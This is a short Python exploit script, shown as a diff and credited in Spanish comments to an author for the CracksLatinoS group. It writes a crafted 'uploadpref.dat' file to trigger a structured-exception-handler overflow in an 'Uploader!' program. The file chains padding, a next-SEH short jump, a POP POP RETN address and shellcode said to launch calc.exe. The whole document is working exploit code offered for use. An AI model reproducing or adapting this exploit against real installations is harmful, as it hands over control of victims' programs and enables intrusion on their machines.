@@ -1,0 +1,38 @@
+#exploit por Daniel - La Calavera
+#Email: Lacalavera@gmail.com
+# Para CracksLatinoS
+
+#relleno
+
+rell = "\x41"* 477
+rell1 = "\x42"* 4000
+
+head = "\x41"* 8
+head += "\x0d\x0a\x31\x0d\x0a"
+head1 = "\x0d\x0a"
+head2 = "170.1.1.0"
+head2 +="\x0d\x0a"
+head2 +="\x22"
+head2 += "C:\Archivos2de2programa\Uploader!\Uploader!23151EXE"
+head2 +="\x22"
+
+
+# shellcode para calc.exe
+
+shellcode = "\x33\xD2\xB2\x50\x80\xF2\x55\x52\xC6\x45"
+shellcode += "\x31\x63\xC6\x45\x32\x61\xC6\x45\x33\x6C"
+shellcode += "\xC6\x45\x34\x63\xC6\x45\x35\x2E\xC6\x45\x36\x65"
+shellcode += "\xC6\x45\x37\x78\xC6\x45\x38\x65\x88\x45"
+shellcode += "\x39\x8D\x45\x31\x50\xB9\x31\x75\x66\x31"
+shellcode += "\x81\xF1\x69\x4D\x26\x31\xFF\xe1"
+
+# Next SHE
+Nshe = "\xeb\x06\x90\x90"
+# POP POP RETN
+PPR = "\x38\xbf\x40\x00"
+
+explo = (head + rell + Nshe + PPR + shellcode + rell1 + head1 + head2)
+arch = open ("uploadpref.dat", "w")
+
+arch.write(explo)
+arch.close
